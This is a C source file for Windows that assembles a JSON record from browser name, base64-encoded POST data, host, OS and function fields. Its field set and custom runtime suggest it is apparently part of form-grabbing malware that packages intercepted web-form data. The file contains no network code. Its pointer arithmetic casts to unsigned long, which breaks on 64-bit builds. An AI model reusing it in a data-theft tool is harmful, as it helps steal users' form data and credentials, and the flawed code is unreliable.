#include <Windows.h>
#include "C Runtime.h"
#include "JSON Constructor.h"
#include "Base64.h"
#include <stdio.h>

#define JSONDELIMETER 9
#define JSONSTART 13
#define JSONEND 7


void CopyMemoryAndOffset(void ** lpDestination, unsigned char* ucData, DWORD dwData)
{

	m_memcpy(*lpDestination,ucData,dwData);
	*(unsigned long*)lpDestination += dwData;

}

void AddEntry(void** lpDestination, unsigned char* ucKey, DWORD dwKey, char* szData, DWORD dwData, BOOL Start, BOOL End)
{



	unsigned char ucDelimeter[] = {0x22,0x3A,0x20, 0x22};
	unsigned char ucStart[] = {0x7B,0x0A,0x20,0x22};
	unsigned char ucPostEnd[] = {0x22, 0x2C, 0x0A, 0x20, 0x22};
	unsigned char ucEnd[] = {0x22, 0x0A, 0x7D};

	if (Start)
	{

		CopyMemoryAndOffset(lpDestination,ucStart,sizeof(ucStart));
		CopyMemoryAndOffset(lpDestination,ucKey, dwKey);
		CopyMemoryAndOffset(lpDestination,ucDelimeter,sizeof(ucDelimeter));
		CopyMemoryAndOffset(lpDestination,(unsigned char*)szData,dwData);
		CopyMemoryAndOffset(lpDestination,ucPostEnd,sizeof(ucPostEnd));


	}
	else if (End)
	{
		CopyMemoryAndOffset(lpDestination,ucKey,dwKey);
		CopyMemoryAndOffset(lpDestination,ucDelimeter,sizeof(ucDelimeter));
		CopyMemoryAndOffset(lpDestination,(unsigned char*)szData,dwData);
		CopyMemoryAndOffset(lpDestination,ucEnd,sizeof(ucEnd));


	}
	else
	{
		CopyMemoryAndOffset(lpDestination,ucKey,dwKey);
		CopyMemoryAndOffset(lpDestination,ucDelimeter,sizeof(ucDelimeter));
		CopyMemoryAndOffset(lpDestination,(unsigned char*)szData,dwData);
		CopyMemoryAndOffset(lpDestination,ucPostEnd,sizeof(ucPostEnd));


	}

}


DWORD CreateJSONRequest(JSONRequest * lpJSONRequest, char* szDestination) 
{
	DWORD dwLen = 0;

	DWORD dwCount = (5*JSONDELIMETER)+((JSONSTART - JSONDELIMETER) + (JSONEND - JSONDELIMETER)); 

	if (lpJSONRequest)
	{
		DWORD dwBase64 = ToBase64CryptoA((const byte*)lpJSONRequest->szPostData, lpJSONRequest->dwPostData,0,0);
		if (dwBase64)
		{
			char *ucBase64  = (char*)HeapAlloc(GetProcessHeap(),0,dwBase64);
			if (ucBase64)
			{
				RtlSecureZeroMemory(ucBase64,dwBase64);
				if (ToBase64CryptoA((const byte*)lpJSONRequest->szPostData,lpJSONRequest->dwPostData,ucBase64,dwBase64))
				{
					dwLen = lpJSONRequest->dwFunction +  lpJSONRequest->dwBrowser +  lpJSONRequest->dwHost +  (dwBase64-1) +  lpJSONRequest->dwOS + lpJSONRequest->dwKeyBrowser + lpJSONRequest->dwKeyFunction + lpJSONRequest->dwKeyHost + lpJSONRequest->dwKeyOS + lpJSONRequest->dwKeyPostData+dwCount;

					if (szDestination)
					{
						unsigned char* szJSONRequest = (unsigned char*)HeapAlloc(GetProcessHeap(),0x00,dwLen);
						if(szJSONRequest)
						{
							unsigned char* szTemp = szJSONRequest;

							RtlSecureZeroMemory(szJSONRequest,dwLen);

							AddEntry((void**)&szTemp, (unsigned char*)lpJSONRequest->szKeyBrowser,lpJSONRequest->dwKeyBrowser, lpJSONRequest->szBrowser,lpJSONRequest->dwBrowser,TRUE,0);
							AddEntry((void**)&szTemp,(unsigned char*)lpJSONRequest->szKeyPostData, lpJSONRequest->dwKeyPostData,ucBase64,dwBase64-1,0,0);
							AddEntry((void**)&szTemp,(unsigned char*)lpJSONRequest->szKeyHost, lpJSONRequest->dwKeyHost,lpJSONRequest->szHost, lpJSONRequest->dwHost,0,0);
							AddEntry((void**)&szTemp,(unsigned char*)lpJSONRequest->szKeyOS, lpJSONRequest->dwKeyOS,lpJSONRequest->szOS, lpJSONRequest->dwOS,0,0);
							AddEntry((void**)&szTemp,(unsigned char*)lpJSONRequest->szKeyFunction, lpJSONRequest->dwKeyFunction,lpJSONRequest->szFunction, lpJSONRequest->dwFunction,0,TRUE);

							m_memcpy(szDestination,szJSONRequest,dwLen);
							HeapFree(GetProcessHeap(),0,szJSONRequest);
							dwLen+=1;
						}
					}
				}
				HeapFree(GetProcessHeap(),0,ucBase64);
			}
		}
	}
	return dwLen;
}